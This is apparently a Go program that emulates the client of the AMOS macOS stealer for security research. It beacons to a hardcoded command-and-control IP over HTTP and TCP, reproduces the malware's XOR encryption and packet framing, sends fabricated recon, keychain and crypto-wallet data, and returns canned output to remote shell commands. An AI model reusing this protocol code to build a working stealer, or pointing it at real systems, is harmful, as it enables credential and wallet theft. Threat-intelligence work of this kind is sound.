// Package main implements the ultimate high-fidelity AMOS C2 emulator for security research.
package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"embed"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	mathrand "math/rand/v2"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

//go:embed screenshot.jpg
var embedFS embed.FS

const (
	C2Host    = "46.30.191.141"
	HTTPURL   = "http://46.30.191.141/index.php" //nolint:revive
	TCPPort   = "1337"
	UserAgent = "curl/8.4.0"
	IDFile    = ".victim_id"
	Marker    = 'K'
	Boundary  = "60ebe5b6-e8c2-4a2c-9037-647a50691f16"
	TCPSig    = 0x41765DDA
)

var OpcodeMap = map[string]string{
	"1": "FULL_RECON",
	"2": "SCREENSHOT",
	"3": "CREDENTIAL_SWEEP",
	"4": "FILE_SEARCH",
	"5": "EXEC_SHELL",
	"6": "TERMINATE",
}

const fakeExodusWallet = `{"mnemonic": "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about", "seed": "5eb00bbddcf069084889a8ab9155568165f5c453ccb85e70811aaed6f6da5fc19a5ac40b389cd370d086206dec8aa6c43daea6690f20ad3d8d48b2d2ce9e38e4"}`

type Emulator struct {
	Log      *slog.Logger
	Client   *http.Client
	UUID     string
	RawID    string
	Hostname string
	User     string
}

func NewEmulator() *Emulator {
	logger := slog.New(slog.NewJSONHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)
	id := loadUUID(logger)
	return &Emulator{
		UUID:     id,
		RawID:    strings.ToUpper(strings.ReplaceAll(id, "-", "")),
		Hostname: "Alexs-MacBook-Air.local",
		User:     "alex",
		Log:      logger,
		Client: &http.Client{
			Timeout:   300 * time.Second,
			Transport: &http.Transport{DisableCompression: true},
		},
	}
}

func loadUUID(logger *slog.Logger) string {
	if data, err := os.ReadFile(IDFile); err == nil {
		id := strings.TrimSpace(string(data))
		logger.Info("uuid_persistence_loaded", "uuid", id)
		return id
	}
	id := fmt.Sprintf("%08X-%04X-4%03X-8%03X-%012X", mathrand.Uint32(), mathrand.Uint32()>>16, mathrand.Uint32()>>20, mathrand.Uint32()>>20, mathrand.Uint64()>>16)
	_ = os.WriteFile(IDFile, []byte(id), 0o644)
	logger.Info("uuid_persistence_generated", "uuid", id)
	return id
}

func (e *Emulator) xor(data []byte) []byte {
	key := []byte(e.RawID)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func (e *Emulator) buildMultiplexedItem(name string, data []byte) []byte {
	e.Log.Debug("staging_item", "name", name, "size", len(data))
	buf := new(bytes.Buffer)
	buf.WriteString(Boundary)
	buf.WriteByte(0x01)
	binary.Write(buf, binary.LittleEndian, uint32(len(data)))
	binary.Write(buf, binary.LittleEndian, uint32(len(name)+1))
	buf.WriteString(name)
	buf.WriteByte(0x00)
	buf.Write(data)
	return buf.Bytes()
}

func (e *Emulator) postHTTP(payload []byte, label string) {
	e.Log.Info("http_post_start", "stage", label, "payload_len", len(payload))
	encrypted := e.xor(payload)
	packet := make([]byte, 33+len(encrypted))
	copy(packet[0:32], []byte(e.RawID))
	packet[32] = Marker
	copy(packet[33:], encrypted)

	e.Log.Debug("wire_header", "id", e.RawID, "marker", "K", "header_hex", hex.EncodeToString(packet[:33]))

	req, _ := http.NewRequestWithContext(context.Background(), http.MethodPost, HTTPURL, bytes.NewBuffer(packet))
	req.Header = make(http.Header)
	req.Header["Host"] = []string{C2Host}
	req.Header["User-Agent"] = []string{UserAgent}
	req.Header["Accept"] = []string{"*/*"}
	req.Header["Content-Type"] = []string{"application/octet-stream"}
	req.Header["Expect"] = []string{"100-continue"}
	req.Header["Connection"] = []string{"Keep-Alive"}

	resp, err := e.Client.Do(req)
	if err != nil {
		e.Log.Error("http_failed", "stage", label, "err", err)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	e.Log.Info("http_response", "stage", label, "code", resp.StatusCode, "body_len", len(body))
}

func (e *Emulator) handleShell(command string) string {
	cmd := strings.TrimSpace(command)
	e.Log.Warn("REMOTE_SHELL_EXEC", "cmd", cmd)
	time.Sleep(time.Duration(250+mathrand.IntN(200)) * time.Millisecond)

	responses := map[string]string{
		"whoami":                             e.User,
		"id":                                 "uid=501(alex) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1)",
		"hostname":                           e.Hostname,
		"uname -a":                           "Darwin Alexs-MacBook-Air.local 23.2.0 Darwin Kernel Version 23.2.0: Wed Nov 15 21:28:27 PST 2023; root:xnu-10002.61.3~2/RELEASE_ARM64_T8103 arm64",
		"sw_vers":                            "ProductName:\tmacOS\nProductVersion:\t14.2.1\nBuildVersion:\t23C71",
		"uptime":                             "14:20  up 3 days, 22:14, 2 users, load averages: 2.14 1.98 2.05",
		"env":                                "USER=alex\nLOGNAME=alex\nHOME=/Users/alex\nSHELL=/bin/zsh",
		"ls -la ~/":                          "total 0\ndrwxr-xr-x  + 65 alex  staff   2080 Feb 14 12:00 .\ndrwxr-xr-x    6 root  admin    192 Dec 10 10:05 ..\n-rw-r--r--@   1 alex  staff   6148 Feb 14 12:05 .DS_Store\ndrwx------   12 alex  staff    384 Feb 14 12:10 Desktop\ndrwx------   25 alex  staff    800 Feb 14 12:15 Documents\ndrwx------   40 alex  staff   1280 Feb 14 12:20 Library",
		"ls -la ~/Desktop":                   "total 16\ndrwx------   12 alex  staff   384 Feb 14 12:10 .\n-rw-r--r--@   1 alex  staff  1024 Feb 14 12:05 .DS_Store\n-rw-------    1 alex  staff  5120 Feb 14 09:15 wallet_recovery.pdf",
		"ls -la ~/Documents":                 "total 8\ndrwx------   25 alex  staff   800 Feb 14 12:15 .\n-rw-r--r--    1 alex  staff  1024 Feb 10 09:00 recovery_seed.txt\n-rw-r--r--    1 alex  staff  4096 Jan 08 11:15 passwords.docx",
		"ls /Applications":                   "Safari.app\nMail.app\nChrome.app\nExodus.app\nLedger Live.app\nTelegram.app\nSlack.app",
		"ifconfig":                           "lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384\n\tinet 127.0.0.1 netmask 0xff000000 \nen0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n\tether a8:66:7f:12:34:56\n\tstatus: active",
		"system_profiler SPHardwareDataType": "Hardware Overview:\n\n      Model Name: MacBook Air\n      Model Identifier: MacBookAir10,1\n      Chip: Apple M1\n      Memory: 16 GB\n      Hardware UUID: " + e.UUID,
		"cat ~/.zsh_history":                 ": 1707912000:0;brew update\n: 1707912060:0;ls -la\n: 1707912180:0;git commit -m \"fix bug\"",
		"ls -la ~/Library/Keychains":         "total 4096\n-rw-------   1 alex  staff  524288 Feb 14 12:00 login.keychain-db",
	}

	if val, ok := responses[cmd]; ok {
		return val
	}
	if strings.Contains(cmd, "pgrep") {
		return ""
	}
	return fmt.Sprintf("zsh: command not found: %s", strings.Fields(cmd)[0])
}

func (e *Emulator) runTCPChannel() {
	e.Log.Info("tcp_loop_init", "host", C2Host, "port", TCPPort)
	for {
		conn, err := net.DialTimeout("tcp", C2Host+":"+TCPPort, 10*time.Second)
		if err != nil {
			e.Log.Debug("tcp_dial_failed", "err", err)
			time.Sleep(30 * time.Second)
			continue
		}

		e.Log.Info("tcp_established", "remote", conn.RemoteAddr().String())
		binary.Write(conn, binary.BigEndian, uint32(TCPSig))

		for {
			heartbeat := fmt.Sprintf("ID: %s | STATUS: IDLE", e.RawID)
			payload := e.xor([]byte(heartbeat))
			e.Log.Info("tcp_heartbeat_send", "plaintext", heartbeat)

			if err := binary.Write(conn, binary.LittleEndian, uint32(len(payload))); err != nil {
				break
			}
			if _, err := conn.Write(payload); err != nil {
				break
			}

			var cmdLen uint32
			conn.SetReadDeadline(time.Now().Add(75 * time.Second))
			if err := binary.Read(conn, binary.LittleEndian, &cmdLen); err != nil {
				e.Log.Debug("tcp_session_timeout")
				break
			}

			cmdBuf := make([]byte, cmdLen)
			if _, err := io.ReadFull(conn, cmdBuf); err != nil {
				break
			}

			decrypted := string(e.xor(cmdBuf))
			e.Log.Warn("TCP_COMMAND_RECEIVED", "raw", decrypted)

			parts := strings.Split(decrypted, "|")
			opcode := parts[0]
			cmdName := OpcodeMap[opcode]

			e.postHTTP(fmt.Appendf(nil, "ACK: Starting %s", cmdName), "behavioral_ack")

			var result []byte
			switch cmdName {
			case "EXEC_SHELL":
				if len(parts) > 1 {
					result = []byte(e.handleShell(parts[1]))
				}
			case "SCREENSHOT":
				e.Log.Warn("SCREENSHOT_TASK")
				img, _ := embedFS.ReadFile("screenshot.jpg")
				entropy := make([]byte, 16)
				_, _ = rand.Read(entropy)
				result = e.buildMultiplexedItem("screenshot.jpg", append(img, entropy...))
			case "CREDENTIAL_SWEEP":
				e.Log.Warn("HARVESTER_TASK")
				result = e.buildMultiplexedItem("login.keychain-db", make([]byte, 2048))
				result = append(result, e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))...)
			}

			if len(result) > 0 {
				e.postHTTP(result, "final_command_result_exfil")
			}
			time.Sleep(10 * time.Second)
		}
		conn.Close()
		time.Sleep(30 * time.Second)
	}
}

func main() {
	e := NewEmulator()
	e.Log.Info("brew_poker_online", "victim_id", e.RawID, "uuid", e.UUID)

	recon := fmt.Sprintf("UUID: %s\nmacOS Password: password123\nHostname: %s\nUsername: %s\nVersion: v1.0.4", e.UUID, e.Hostname, e.User)
	e.postHTTP(e.buildMultiplexedItem("recon.txt", []byte(recon)), "init_recon")

	time.Sleep(500 * time.Millisecond)
	loot := e.buildMultiplexedItem("login.keychain-db", make([]byte, 1024))
	loot = append(loot, e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))...)
	e.postHTTP(loot, "init_loot_dump")

	e.runTCPChannel()
}
